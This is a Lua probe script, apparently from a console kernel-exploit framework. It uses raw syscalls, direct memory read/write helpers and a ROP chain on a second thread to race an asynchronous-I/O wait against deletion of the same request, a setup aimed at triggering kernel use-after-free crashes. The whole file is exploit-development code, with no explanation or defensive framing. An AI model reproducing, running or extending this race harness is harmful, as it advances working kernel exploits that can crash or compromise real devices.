-- CRASH_CLASS: HIGH
-- PROBE 645a: a thread waits on a pending aio request while the parent deletes it
print("=== PROBE 645a: AIO WAIT vs DELETE ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local sc669=mk(669) local sc664=mk(664) local sc662=mk(662) local sc454=mk(454) local sc663=mk(663)
local sc97=mk(135)
local sv=memory.alloc(0x10)
local sr=pcall(function() return sc97(uint64(1),uint64(1),uint64(0),uint64(N(sv))) end)
local fa=rd(N(sv)) local fb=rd(N(sv)+4)
print(string.format("[A] socketpair ok=%s a=%s b=%s",tostring(sr),tostring(fa),tostring(fb)))
if not sr or not fa or not fb or fa<=0 then return end
local aiocb=memory.alloc(0x40)
local buf=memory.alloc(0x400)
local out=memory.alloc(0x40) local chk=memory.alloc(0x40)
for i=0,0x3C,4 do wd(N(aiocb)+i,0) end
wd(N(aiocb),fa)          -- aio_fildes
wd(N(aiocb)+4,0)         -- aio_lio_opcode = read
wq(N(aiocb)+8,uint64(N(buf)))
wq(N(aiocb)+0x10,uint64(0x100))
wq(N(aiocb)+0x18,uint64(0))
local o,r=pcall(function() return sc669(uint64(1),uint64(N(aiocb)),uint64(1),uint64(1),uint64(N(out))) end)
local id=rd(N(out))
print(string.format("[B] create ret=%d id=%s",o and N(r) or -99,tostring(id)))
if not o or N(r)~=0 or not id or id<=0 then return end
local ids=memory.alloc(8)
wd(N(ids),id)
wd(N(chk),0x77777777)
pcall(function() sc664(U(N(ids)),uint64(1),uint64(N(chk))) end)
print(string.format("[C] poll=%s",tostring(rd(N(chk)))))
local ts=memory.alloc(0x10)
wq(N(ts),uint64(0)) wq(N(ts)+8,uint64(50000000))
local wout=memory.alloc(0x40)
local W=memory.alloc(8)
wq(N(W),uint64(0))
local c=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
c:push_syscall_with_ret(mk(454), U(N(W)), uint64(2), uint64(0))
c:push_syscall_with_ret(mk(663), U(N(ids)), uint64(1), U(N(wout)), U(N(ts)), uint64(0), uint64(0))
local t=thread:new(c)
t:run(true)
for i=1,100000 do local k=i end
wq(N(W),uint64(1))
pcall(function() sc454(U(N(W)),uint64(3),uint64(0x7fffffff)) end)
print("[D] waiter released")
for i=1,800000 do local k=i end
local w0=rd(N(wout))
print(string.format("[E] wait out before delete=%s",tostring(w0)))
wd(N(chk),0x77777777)
local d1,r1=pcall(function() return sc662(U(N(ids)),uint64(1),uint64(N(chk))) end)
print(string.format("[F] delete ret=%s status=%s",tostring(d1 and r1 or "err"),tostring(rd(N(chk)))))
for i=1,400000 do local k=i end
print(string.format("[G] wait out after delete=%s",tostring(rd(N(wout)))))
print(string.format("[H] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
pcall(function() t:join() end)
print("[Z] done")
